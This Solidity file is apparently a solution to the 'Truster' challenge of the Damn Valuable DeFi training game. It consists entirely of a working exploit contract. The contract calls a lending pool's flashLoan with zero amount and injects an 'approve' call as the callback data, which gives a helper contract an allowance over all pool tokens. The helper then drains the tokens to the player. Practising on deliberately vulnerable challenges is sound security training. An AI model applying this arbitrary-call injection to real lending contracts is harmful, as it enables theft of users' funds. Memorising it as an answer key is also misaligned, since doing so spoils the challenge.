// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/truster/TrusterLenderPool.sol";
import "../../src/DamnValuableToken.sol";

contract TmpAttacker {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    address player;
    address pool;
    DamnValuableToken token;
    constructor(address _player,address _token, address _pool){
        player = _player;
        pool = _pool;
        token = DamnValuableToken(_token);
    }

    function withdraw() external{
        token.transferFrom(pool, player, TOKENS_IN_POOL);
    }
}


contract Attacker {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address  _pool, address  _token){
        TmpAttacker attacker  = new TmpAttacker(msg.sender, _token,_pool);

        TrusterLenderPool pool = TrusterLenderPool(_pool);
        
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(attacker), _token, data);
        attacker.withdraw();
    }
}